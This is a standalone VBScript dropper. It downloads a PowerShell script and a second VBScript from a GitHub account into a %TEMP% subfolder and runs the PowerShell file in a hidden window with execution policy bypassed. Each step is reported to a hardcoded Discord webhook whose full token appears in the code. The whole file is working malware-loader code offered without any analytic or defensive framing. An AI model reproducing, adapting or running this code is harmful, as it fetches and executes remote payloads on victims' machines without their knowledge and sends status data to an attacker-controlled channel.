Option Explicit

Dim objXMLHTTP, objADOStream, objFSO, objShell
Dim strPs1URL, strWinURL
Dim strRootPath, strPs1Path, strWinPath
Dim intWait
Dim strWebhookURL, strOutput

strWinURL = "https://github.com/invisibleghostshell-ux/last/raw/main/win.vbs"
strPs1URL = "https://github.com/invisibleghostshell-ux/last/raw/main/setup.ps1"

' Create WScript.Shell object to get the environment variable
Set objShell = CreateObject("WScript.Shell")

' Root directory in TEMP folder
strRootPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\ZZ\"

strPs1Path = strRootPath & "setup-lua.ps1"
strWinPath = strRootPath & "win.vbs"

intWait = 5000 ' 5 seconds in milliseconds
strWebhookURL = "https://discord.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2"

Set objFSO = CreateObject("Scripting.FileSystemObject")

' Function to send output to Discord using WinHTTP
Function SendToDiscord(message)
    On Error Resume Next
    Dim objWinHTTP, strRequestBody
    Set objWinHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    strRequestBody = "{""content"":""" & message & """}"
    objWinHTTP.Open "POST", strWebhookURL, False
    objWinHTTP.SetRequestHeader "Content-Type", "application/json"
    objWinHTTP.Send strRequestBody
    If Err.Number <> 0 Then
        WScript.Echo "Failed to send message to Discord: " & message
    End If
    On Error GoTo 0
End Function

' Function to download files
Function DownloadFile(url, localFile)
    On Error Resume Next
    Dim objXMLHTTP, objADOStream
    Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    Set objADOStream = CreateObject("ADODB.Stream")
    
    objXMLHTTP.Open "GET", url, False
    objXMLHTTP.Send
    
    If objXMLHTTP.Status = 200 Then
        objADOStream.Type = 1 ' adTypeBinary
        objADOStream.Open
        objADOStream.Write objXMLHTTP.ResponseBody
        objADOStream.SaveToFile localFile, 2 ' adSaveCreateOverWrite
        objADOStream.Close
        SendToDiscord "Downloaded: " & url
    Else
        SendToDiscord "Failed to download: " & url & " with status " & objXMLHTTP.Status
    End If
    On Error GoTo 0
End Function

' Create root folder
If Not objFSO.FolderExists(strRootPath) Then
    objFSO.CreateFolder(strRootPath)
    If objFSO.FolderExists(strRootPath) Then
        SendToDiscord "Created root folder: " & strRootPath
    Else
        SendToDiscord "Failed to create root folder: " & strRootPath
    End If
End If

' Download PowerShell script if it does not exist
SendToDiscord "Starting download of PowerShell script..."
If Not objFSO.FileExists(strPs1Path) Then DownloadFile strPs1URL, strPs1Path

' Download VBS script if it does not exist
SendToDiscord "Starting download of VBS script..."
If Not objFSO.FileExists(strWinPath) Then DownloadFile strWinURL, strWinPath

SendToDiscord "Download completed. Waiting for 1 minute..."
WScript.Sleep intWait

' Execute the PowerShell script
Dim objProcess, strExecResult
Set objProcess = CreateObject("WScript.Shell")
If objFSO.FileExists(strPs1Path) Then
    SendToDiscord "Executing PowerShell script..."
    objProcess.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File """ & strPs1Path & """", 0, False
    SendToDiscord "Executed: " & strPs1Path
End If
